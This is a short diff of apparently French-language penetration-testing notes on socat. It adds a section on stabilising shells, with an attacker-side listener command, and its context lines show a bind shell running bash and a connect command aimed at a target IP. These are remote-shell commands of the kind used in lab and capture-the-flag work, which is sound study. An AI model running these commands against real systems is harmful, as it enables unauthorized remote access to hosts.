@@ -32,3 +32,12 @@ socat TCP-L:<PORT> EXEC:"bash -li"
 ```
 socat TCP:<TARGET-IP>:<TARGET-PORT> -
 ```
+
+
+### Stabiliser des shells avec socat
+
+[Attaquant] target -> Linux
+```
+socat TCP-L:<port> FILE:`tty`,raw,echo=0
+```
+
